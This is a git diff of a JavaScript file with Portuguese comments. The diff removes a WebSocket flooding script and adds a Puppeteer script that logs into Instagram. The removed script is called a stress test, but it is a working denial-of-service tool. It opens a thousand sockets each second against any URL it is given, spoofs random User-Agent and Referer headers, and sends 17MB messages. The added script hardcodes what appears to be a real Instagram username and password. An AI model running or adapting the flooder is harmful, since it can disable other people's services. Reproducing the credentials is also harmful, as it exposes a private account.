@@ -1,83 +1,41 @@
-const fs = require('fs');
-const WebSocket = require('ws');
+const puppeteer = require('puppeteer');
 
-// Carregar User Agents e Referers dos arquivos
-const userAgents = fs.readFileSync('useragents.txt', 'utf8').split('\n');
-const referers = fs.readFileSync('referers.txt', 'utf8').split('\n');
+(async () => {
+  const browser = await puppeteer.launch();
+  const page = await browser.newPage();
+  await page.goto('https://www.instagram.com/');
 
-// Função para enviar WebSockets com amplificação de tráfego em loop
-function sendWebSocketsInLoop(url, numSockets, duration) {
-  let intervalId;
-  let elapsedTime = 0;
+  // Aguarda até que os campos de entrada de usuário e senha estejam prontos para uso
+  await page.waitForSelector('input[name="username"]');
+  await page.waitForSelector('input[name="password"]');
+  await page.waitForSelector('button[type="submit"]');
 
-  function getRandomElement(array) {
-    return array[Math.floor(Math.random() * array.length)];
+  // Insira suas credenciais aqui
+  const username = 'seyzalel';
+  const password = 'Sey17zalel17@$';
+
+  // Insere o usuário e a senha
+  await page.type('input[name="username"]', username);
+  await page.type('input[name="password"]', password);
+
+  // Aguarda até que o botão de login esteja habilitado
+  await page.waitForFunction(() => !document.querySelector('button[type="submit"]').hasAttribute('disabled'));
+
+  // Clica no botão de login
+  await page.click('button[type="submit"]');
+
+  // Aguarda o redirecionamento após o login
+  await page.waitForNavigation();
+
+  // Verifica se a URL de redirecionamento contém 'accounts' ou 'onetap'
+  const redirectedURL = page.url();
+  if (redirectedURL.includes('accounts') || redirectedURL.includes('onetap')) {
+    // Insira as ações adicionais necessárias após o login, como navegar para uma determinada página
+    console.log("Login bem-sucedido!");
+  } else {
+    console.log("URL de redirecionamento desconhecida após o login.");
   }
 
-  function createSockets() {
-    for (let i = 0; i < numSockets; i++) {
-      const socket = new WebSocket(url, {
-        headers: {
-          'User-Agent': getRandomElement(userAgents),
-          'Referer': getRandomElement(referers)
-        }
-      });
-
-      socket.onopen = () => {
-        console.log(`WebSocket ${i+1} connected`);
-        sendLargeMessage(socket);
-      };
-
-      socket.onerror = (error) => {
-        console.error(`WebSocket ${i+1} error: ${error.message}`);
-      };
-
-      socket.onclose = () => {
-        console.log(`WebSocket ${i+1} disconnected`);
-      };
-    }
-  }
-
-  function sendLargeMessage(socket) {
-    const message = generateLargeMessage();
-    socket.send(message);
-  }
-
-  function generateLargeMessage() {
-    // Gerar uma mensagem grande, por exemplo, uma string de 17MB
-    const seventeenMBString = Array(17 * 1024 * 1024).fill('a').join('');
-    return seventeenMBString;
-  }
-
-  function stopSending() {
-    clearInterval(intervalId);
-    console.log(`Teste de stress concluído após ${duration} segundos.`);
-    process.exit(0);
-  }
-
-  intervalId = setInterval(() => {
-    elapsedTime += 1;
-    console.log(`Tempo decorrido: ${elapsedTime} segundos`);
-
-    if (elapsedTime >= duration) {
-      stopSending();
-    } else {
-      createSockets();
-    }
-  }, 1000);
-}
-
-// Argumentos da linha de comando
-const args = process.argv.slice(2);
-const url = args[0];
-const duration = parseInt(args[1], 10); // Duração em segundos
-const numSockets = 1000;
-
-// Verifica se a URL e a duração foram fornecidas corretamente
-if (!url || isNaN(duration) || duration <= 0) {
-  console.error('Por favor, forneça uma URL válida e uma duração em segundos.');
-  process.exit(1);
-}
-
-// Inicia o envio de WebSockets e mensagens em loop
-sendWebSocketsInLoop(url, numSockets, duration);
+  // Fecha o navegador após a conclusão
+  await browser.close();
+})();
